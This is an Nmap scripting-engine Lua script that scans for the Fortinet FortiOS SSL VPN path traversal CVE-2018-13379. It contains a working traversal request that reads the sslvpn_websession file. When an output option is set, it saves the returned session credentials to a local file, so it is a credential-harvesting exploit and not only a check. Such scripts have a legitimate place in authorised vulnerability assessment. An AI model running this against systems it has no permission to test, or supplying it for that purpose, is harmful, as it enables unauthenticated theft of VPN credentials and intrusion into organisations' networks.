local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local table = require "table"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"
local io = require "io"

description = [[
Performs a scan to check whether the scanned server is vulnerable to CVE-2018-13379
]]
---
-- @usage
-- nmap --script CVE-2018-13379 -p <port> <host>
-- nmap --script CVE-2018-13379 -p <port> <host> --script-args output='file.txt'
-- @output
-- PORT   STATE SERVICE
-- 443/tcp open  http
-- | CVE-2018-13379: 
-- |   Host is vulnerable to CVE-2018-13379
-- @changelog
-- 2019-23-08 - Author Alejandro Flores Covarrubias <alejandro.florescova@gmail.com> by Purple Security
-- Twitter: alejandrocovrr
-- Twitter: purplesecmx
-- @xmloutput
-- <table key="NMAP-1">
-- <elem key="title">Fortinet SSL VPN Path Traversal</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="description">
-- <elem>An Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal") in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 under SSL VPN web portal allows an unauthenticated attacker to download system files via special crafted HTTP resource requests.
-- in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 under SSL VPN web portal
-- allows an unauthenticated attacker to download system files
-- via special crafted HTTP resource requests.
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2018</elem>
-- <elem key="day">7</elem>
-- <elem key="month">06</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2018-07-6</elem>
-- <table key="extra_info">
-- <elem>Credentials are stored to output file</elem>
-- </table>
-- <table key="refs">
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379</elem>
-- <elem>https://nvd.nist.gov/vuln/detail/CVE-2018-13379</elem>
-- <elem>https://fortiguard.com/psirt/FG-IR-18-384</elem>
-- <elem>https://www.securityfocus.com/bid/108693/</elem>
-- </table>
-- </table>

author = "Alejandro Flores Covarrubias <alejandro.florescova@gmail.com> @alejandrocovrr @purplesecmx"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive","vuln"}

portrule = shortport.ssl

action = function(host,port)
  local outputFile = stdnse.get_script_args(SCRIPT_NAME..".output") or nil
  local vuln = {
    title = 'Fortinet SSL VPN Path Traversal',
    state = vulns.STATE.NOT_VULN,
    description = [[
	  An Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal") 
	  in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 under SSL VPN web portal allows 
	  an unauthenticated attacker to download system files via special crafted HTTP resource requests.
    ]],
    references = {
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379',
      'https://nvd.nist.gov/vuln/detail/CVE-2018-13379',
      'https://fortiguard.com/psirt/FG-IR-18-384',
      'https://www.securityfocus.com/bid/108693/'
    },
    dates = {
      disclosure = {year = '2018', month = '07', day = '06'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local path = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
  local response
  local output = {}
  local success = "Host is vulnerable to CVE-2018-13379 (Fortinet SSL VPN)"
  local fail = "Host is not vulnerable"
  local match = "var fgt_lang"
  local credentials
  local pathTraversal
	
  response = http.get(host, port.number, path)  

  -- Request failed
  if not response.status then
    -- Bad response
    stdnse.print_debug("REQUEST FAILED")
	-- Exit
    return
  end
  -- 200 response status - Success
  if response.status == 200 then
    if string.match(response.body, match) then
      stdnse.print_debug("%s: %s GET %s - 200 OK", SCRIPT_NAME,host.targetname or host.ip, path)
      vuln.state = vulns.STATE.VULN
      pathTraversal = (("Path traversal: https://%s:%d%s"):format(host.targetname or host.ip,port.number, path))
		
      if outputFile then
        credentials = response.body:gsub('%W','.')
	vuln.check_results = stdnse.format_output(true, pathTraversal)
        vuln.extra_info = stdnse.format_output(true, "Credentials are being stored in the output file")
	file = io.open(outputFile, "a")
	file:write(credentials, "\n")
      else
        vuln.check_results = stdnse.format_output(true, pathTraversal)
      end
    end
  -- 403 response status
  elseif response.status == 403 then
    stdnse.print_debug("%s: %s GET %s - %d", SCRIPT_NAME, host.targetname or host.ip, path, response.status)
    vuln.state = vulns.STATE.NOT_VULN
  end

  return vuln_report:make_output(vuln)
end
